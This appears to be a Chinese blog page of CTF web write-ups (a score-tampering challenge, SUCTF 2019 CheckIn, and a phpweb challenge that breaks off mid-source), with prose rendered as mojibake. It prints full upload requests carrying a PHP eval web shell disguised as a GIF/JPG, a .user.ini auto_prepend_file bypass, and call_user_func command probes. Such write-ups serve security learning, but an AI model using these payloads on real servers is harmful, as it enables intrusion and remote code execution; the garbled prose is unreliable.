<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/submit_score</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">29530</span><span class="hljs-symbol">/</span><br>Content-type:application<span class="hljs-symbol">/json</span><br><br>&#123;<br><span class="hljs-string">&quot;score&quot;</span>:<span class="hljs-number">50000</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>æ‹¿åˆ°flag</p>
<p>å‰ç«¯å¯ä»¥è‡ªå·±æ”¹ï¼Œè¿˜æœ‰æ³¨é‡Šï¼Œæœ‰å¾ˆå¤šæ–¹æ³•è§£<br>æ¯”å¦‚å‰ç«¯æ‰¾åˆ°åƒè±†é€»è¾‘å§åƒä¸€ä¸ªè“è±†æ”¹ä¸º100000000ç›´æ¥æ‹¿åˆ°  </p>
<h1 id="SUCTF-2019-CheckIn-1"><a href="#SUCTF-2019-CheckIn-1" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>ä¼ æ­£å¸¸å›¾ç‰‡æç¤ºé‡Œé¢æœ‰&lt;?ä¸ç»™ä¼ ï¼Œä¼ ç çœ‹çœ‹ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>407<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryE46PLUBJtp0zgdcj<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">æäº¤</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj--</span></span><br></code></pre></td></tr></table></figure>
<p>æç¤ºï¼š<br>exif_imagetype:not image!</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8mJUC80q1aGOXScd<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">FFD8FF</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">æäº¤</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd--</span></span><br></code></pre></td></tr></table></figure>
<p>æç¤ºï¼š<br>exif_imagetype:not image!</p>
<p>è¿™æ¬¡æ¢ä¸ªæ–‡ä»¶å¤´ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3I0b63Tc4FZzgA5s<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">GIF89a</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">æäº¤</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s--</span></span><br></code></pre></td></tr></table></figure>
<p>å›æ˜¾  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>é‚£ç›®å½•å°±æ˜¯<br>&#x2F;uploads&#x2F;9987df285bb375eda68448315c5656e5&#x2F;php2.jpg<br>èš‚èšåˆæ˜¯è¿ä¸ä¸Šï¼Œä½†æ˜¯è¿™æ¬¡æ˜¯nginxæœåŠ¡å™¨å•Šï¼Œ<br>é‚£å¯èƒ½å°±æ˜¯user.iniæ–‡ä»¶äº†<br>æäº¤ï¼š  </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">GIF89a<br>auto_prepend_file <span class="hljs-operator">=</span> php2.jpg<br></code></pre></td></tr></table></figure>
<p>å›æ˜¾ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;.user.ini&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[4]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ª.user.iniçš„å¤§æ¦‚ç”¨æ³•æ˜¯è®©ç›®å½•ä¸‹æ‰€æœ‰phpæ–‡ä»¶åŒ…å«ä¸Šä½ æŒ‡å®šçš„æ–‡ä»¶ï¼Œçœ‹å›æ˜¾æˆ‘ä¸Šä¼ çš„ç›®å½•ä¸Šæ˜¯æœ‰ä¸€ä¸ªindex.phpçš„ï¼Œæ‰€ä»¥èƒ½ç”¨.user.iniçš„åŠæ³•<br>èš‚èšè¿ç›®å½•ä¸Šçš„index.phpå³å¯<br>flag{e8b4a853-b79a-4497-912e-389a9fda03ba}</p>
<h1 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h1><p>å¼€é—¨è§å­™ç¬‘å·ï¼Œç„¶åä¼šè‡ªå·±åˆ·æ–°ï¼Œæ¯æ¬¡åˆ·æ–°éƒ½çˆ†ä¸€æ ·çš„é”™è¯¯</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-number">2025</span>-<span class="hljs-number">05</span>-<span class="hljs-number">07</span> <span class="hljs-number">02</span>:<span class="hljs-number">09</span>:<span class="hljs-number">32</span> pm<br></code></pre></td></tr></table></figure>
<p>é—®ä¸€ä¸‹deepseekï¼š<br>è¿™ä¸ªè­¦å‘Šæ„å‘³ç€PHPåœ¨å¤„ç†æ—¥æœŸå’Œæ—¶é—´æ—¶æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„æ—¶åŒºè®¾ç½®ã€‚</p>
<p>å¥½å§ï¼ŒçŸ¥é“ç«™ç‚¹çœŸå®ç›®å½•   </p>
<p>æ‰«ä¸€ä¸‹ç›®å½•,å•¥ä¹Ÿæ²¡æ‰«åˆ°<br>ç”¨bpæŠ“åŒ…ï¼Œå‘ç°å®ƒè¦åˆ·æ–°æ—¶å°±ä¼šå‘æœåŠ¡å™¨è¿”å›å¦‚ä¸‹è¯·æ±‚å¤´  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">29</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Origin</span>: http://b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br><span class="hljs-attribute">func</span>=date&amp;p=Y-m-d+h%<span class="hljs-number">3</span>Ai%<span class="hljs-number">3</span>As+a<br></code></pre></td></tr></table></figure>
<p>æŠŠdateæ”¹ä¸ºflag.phpçœ‹çœ‹  </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: call_user_func() expects parameter <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a <span class="hljs-keyword">valid</span> callback, <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;flag.php&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span> <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> <span class="hljs-type">name</span> <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
<p>æŠŠpçš„å€¼å»æ‰å€¼ä¼ funcçœ‹çœ‹</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Warning:</span> <span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24</span><br></code></pre></td></tr></table></figure>
<p>æ²¡è§è¿‡è¿™ç§ï¼Œæ²¡æ€è·¯äº†<br>æ³¨æ„åˆ°ï¼Œå›æ˜¾çš„æ—¶é—´å¥½åƒç¬¦åˆpå‚æ•°çš„æ ¼å¼<br>Y-m-d+h%3Ai%3As+a<br>é‚£ä¹ˆå°è¯•ä¸€ä¸‹på‚æ•°  </p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">func=<span class="hljs-type">date</span>&amp;p=ls;ls<br><br><span class="hljs-symbol">Warning:</span> <span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24</span><br>Wednesday12;Wednesday12<br></code></pre></td></tr></table></figure>
<p>æ²¡åŠæ³•äº†ï¼Œçœ‹wpå§  </p>
<p>çœ‹å¥½åƒfuncå’Œpæ˜¯èƒ½ç›´æ¥æ‰§è¡Œå‡½æ•°çš„ï¼Œpå°±æ˜¯å‚æ•°ï¼Œæˆ‘è¿˜ä»¥ä¸ºdateæ˜¯ä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°  </p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">func=echo&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: call_user_func() expects <span class="hljs-keyword">parameter</span> <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a valid callback, <span class="hljs-keyword">function</span> <span class="hljs-symbol">&#x27;echo</span>&#x27; <span class="hljs-keyword">not</span> found <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> name <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=system&amp;p=ls<br><br>Hacker...<br><br>func=highlight_file()&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: call_user_func() expects <span class="hljs-keyword">parameter</span> <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a valid callback, <span class="hljs-keyword">function</span> <span class="hljs-symbol">&#x27;highlight_file</span>()&#x27; <span class="hljs-keyword">not</span> found <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> name <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=highlight_file&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: highlight_file(./flag): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: No such <span class="hljs-keyword">file</span> <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br><span class="hljs-literal">Warning</span>: highlight_file(): Failed opening &#x27;./flag&#x27; <span class="hljs-keyword">for</span> highlighting <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=highlight_file&amp;p=/../../../flag<br><br><span class="hljs-literal">Warning</span>: highlight_file(/../../../flag): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: No such <span class="hljs-keyword">file</span> <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br><span class="hljs-literal">Warning</span>: highlight_file(): Failed opening &#x27;/../../../flag&#x27; <span class="hljs-keyword">for</span> highlighting <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>//çœ‹æ¥æ— æ³•è¿›è¡Œç›®å½•ç©¿è¶Š<br></code></pre></td></tr></table></figure>
<p>é‚£å°±çœ‹æºç å§<br>func&#x3D;highlight_file&amp;p&#x3D;index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;phpweb&lt;/title&gt;<br>    &lt;style type=<span class="hljs-string">&quot;text/css&quot;</span>&gt;<br>        body &#123;<br>            background: <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&quot;bg.jpg&quot;</span>) no-repeat;<br>            background-size: <span class="hljs-number">100</span>%;<br>        &#125;<br>        p &#123;<br>            color: white;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>&lt;script language=javascript&gt;<br>    <span class="hljs-title function_ 